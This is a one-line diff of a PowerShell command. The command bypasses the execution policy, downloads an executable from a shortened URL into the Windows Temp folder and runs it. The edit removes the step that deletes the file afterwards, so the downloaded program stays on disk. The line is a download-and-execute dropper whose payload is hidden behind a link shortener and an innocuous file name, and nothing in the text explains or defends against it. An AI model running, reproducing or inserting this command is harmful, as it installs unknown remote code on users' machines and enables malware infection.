@@ -1,1 +1,1 @@
-powershell -ExecutionPolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://bitly.cx/BoIg4', 'C:\Windows\Temp\assetsb.exe'); Start-Process ('C:\Windows\Temp\assetsb.exe')"; del C:\Windows\Temp\assetsb.exe
+powershell -ExecutionPolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://bitly.cx/BoIg4', 'C:\Windows\Temp\assetsb.exe'); Start-Process ('C:\Windows\Temp\assetsb.exe')"
